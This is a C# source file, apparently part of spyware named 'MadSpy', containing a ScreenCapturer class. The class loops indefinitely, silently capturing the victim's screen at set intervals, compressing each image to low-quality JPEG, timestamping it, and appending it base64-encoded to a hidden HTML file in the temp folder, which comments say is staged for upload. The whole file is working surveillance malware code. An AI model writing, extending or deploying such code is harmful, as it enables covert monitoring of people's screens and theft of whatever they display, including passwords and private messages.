using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using System.Drawing.Drawing2D;
using System.Windows.Forms;
using System.IO;
using System.Drawing.Text;

namespace MadSpy
{
    public class ScreenCapturer
    {
        public static void Capture(Data data)
        {
            while (true) 
            {
                int screenCapturerInterval;
                int screenWidth;
                int screenHeight;
                lock (Program.DATALOCK) 
                {
                    screenCapturerInterval = data.ScreenCapturerInterval;
                    screenWidth = data.ScreenWidth;
                    screenHeight = data.ScreenHeight;
                }

                Thread.Sleep(screenCapturerInterval);

                Status status;
                lock (Program.DATALOCK)
                {
                    status = data.Status;
                }

                if (status != Status.Active) 
                {
                    continue;
                }

                using (Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    var graph = Graphics.FromImage(bmpScreenCapture);
                    graph.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bmpScreenCapture.Size, CopyPixelOperation.SourceCopy);
                    graph.Flush();
                    
                    MemoryStream ms = new MemoryStream();

                    var encoder = GetEncoder(System.Drawing.Imaging.ImageFormat.Jpeg);
                    var parameters = new EncoderParameters(1);
                    parameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 20L);

                    float width = screenWidth;
                    float height = screenHeight;
                    float scale = Math.Min(width / bmpScreenCapture.Width, height / bmpScreenCapture.Height);
                    var brush = new SolidBrush(Color.Black);

                    using (var bmpReady = new Bitmap((int)width, (int)height))
                    {
                        var graphReady = Graphics.FromImage(bmpReady);
                        var rectf = new RectangleF(0, 0, bmpReady.Width, bmpReady.Height);
                        var scaleWidth = (int)(bmpScreenCapture.Width * scale);
                        var scaleHeight = (int)(bmpScreenCapture.Height * scale);

                        graphReady.FillRectangle(brush, new RectangleF(0, 0, width, height));
                        graphReady.DrawImage(bmpScreenCapture, new Rectangle(((int)width - scaleWidth) / 2, ((int)height - scaleHeight) / 2, scaleWidth, scaleHeight));
                        graphReady.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;

                        //
                        // a text timestamp is added to the image, in such way in will be much more easy to classify once stored
                        //
                        StringFormat format = new StringFormat()
                        {
                            Alignment = StringAlignment.Near,
                            LineAlignment = StringAlignment.Near
                        };

                        graphReady.DrawString(DateTime.Now.ToString("F"), new Font("Tahoma", 12), Brushes.GreenYellow, rectf, format);
                        graphReady.Flush();

                        bmpReady.Save(ms, encoder, parameters);
                    }

                    byte[] byteImage = ms.ToArray();

                    lock (Program.IMGLOCK)
                    {
                        using (var sw = new StreamWriter(Path.GetTempPath() + @"\img.html", true))
                        {
                            //
                            // since data have to be uploaded, they're stored locally in a base64 text format, once compressed.
                            //
                            sw.Write("<img src='data:image/jpeg;base64,");
                            sw.Write(Convert.ToBase64String(byteImage));
                            sw.Write("' />");
                            sw.Write("\r\n");
                        }
                    }
                }
            }
        }

        //
        // used to return information about imagecodec once the format is set
        //
        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();

            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }
    }
}
